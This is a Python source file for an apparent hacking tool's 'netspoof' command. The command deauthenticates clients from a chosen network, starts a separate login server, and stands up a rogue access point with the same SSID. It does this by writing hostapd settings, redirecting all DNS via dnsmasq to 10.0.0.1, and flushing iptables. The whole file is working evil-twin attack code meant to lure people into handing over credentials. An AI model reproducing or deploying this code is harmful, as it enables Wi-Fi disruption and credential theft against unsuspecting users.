import os
import time


class netspoof():

    def __init__(self):
        self.req_var = True
        self.opt_var = False
        self.req_variables = ["-s", "-a", "-c", "-d", "-b"]

    def help(self):
        hlp = (
            "\nDescription:\n"
            "############\n"
            "\nCommand will deauthorize a specifc network than spoof a user "
            "into reconecting with a spoofed network."
            "If you wish to exit the spoof "
            "use the control + c\n"
            "\nUsage:\n"
            "############\n"
            "\n'netspoof -s <ssid> -a <ap_interface> -c <channel> -d <deauth_interface> -b <bssid to deaauth>'\n"
        )
        return hlp

    def netspoof(self, var):
        if "-s" and "-a" and "-c" and "-d" and "-b" in var:
            try:
                # starting deauth attack and login server 
                os.system("sudo gnome-terminal -x sh -c 'sudo python login_server.py'")
                cmd = 'sudo python deauth.py ' + var["-d"] + ' ' + var["-b"]
                os.system("sudo gnome-terminal -x sh -c" + " '" + cmd + "'")
                self.createAP(var["-s"], var["-a"], var["-c"])
            except Exception:
                error = []
                error.append("1")
                error.append("Cannot spoof the network " + "'" + var["-s"] + "'")
                return error
        else:
            error = []
            error.append("1")
            error.append("Error: Need to specifiy a network to spoof")
            return error

    def createAP(self, ssid, iface, channel):
        #time.sleep(2)
        os.system("sudo ifconfig " + iface + " 10.0.0.1 netmask 255.255.255.0")

        # editing config file for ap settings
        ap_confile = open("hostapd.conf", "w")
        config = (
            "interface=" + iface + "\n"
            "ssid=" + ssid + "\n"
            "driver=nl80211\n"
            "ignore_broadcast_ssid=0\n"
            "channel=" + channel + "\n"
            "hw_mode=g\n"
            "auth_algs=1\n"
            "macaddr_acl=0\n"
            "wpa_pairwise=TKIP CCMP\n"
            "rsn_pairwise=CCMP\n"
        )
        ap_confile.write(config)
        ap_confile.close()

        dhcp_confile = open("/etc/dnsmasq.conf", "a")
        config = (
            "interface=" + iface + "\n"
            "address=/#/10.0.0.1\n"
            "dhcp-range=10.0.0.2,10.0.0.250,12h\n"
            "no-hosts\n"

        )
        dhcp_confile.write(config)
        dhcp_confile.close()
        os.system("sudo iptables -F")
        os.system("iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT")
        os.system("sysctl -w net.ipv4.conf.all.route_localnet=1")
        os.system("echo '1' > /proc/sys/net/ipv4/ip_forward")

        
        try:
            # start start AP and dhcp
            os.system("sudo rfkill unblock all")
            os.system("sudo service dnsmasq restart")
            #os.system("sudo service hostapd start")
            os.system("sudo hostapd hostapd.conf")
            os.system("sudo service dnsmasq stop")
            os.system("sudo service hostapd stop")
            os.system('iptables -F')
            os.system('iptables -X')
            os.system('iptables -t nat -F')
            os.system('iptables -t nat -X')
            os.system("sudo ifconfig " + iface + " down")
            readFile = open("/etc/dnsmasq.conf")

            lines = readFile.readlines()

            readFile.close()
            w = open("/etc/dnsmasq.conf",'w')

            w.writelines([item for item in lines[:-4]])

            w.close()
            os.system("sudo ifconfig " + iface + " up")
        except KeyboardInterrupt, e:
            return

